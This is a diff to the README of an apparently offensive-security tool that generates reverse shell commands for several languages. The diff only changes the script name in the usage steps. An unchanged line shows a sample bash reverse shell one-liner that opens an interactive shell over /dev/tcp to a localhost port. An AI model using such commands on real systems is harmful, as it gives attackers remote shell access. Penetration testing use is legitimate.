@@ -12,7 +12,7 @@ A Python script to generate reverse shell commands for various programming langu
 git clone https://github.com/yourusername/reverse-shell-generator.git
 
 2. Run the script:
-python reverse_shell_generator.py
+python ReverseShellGenerator.py
 
 ## Output Example
 Bash: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
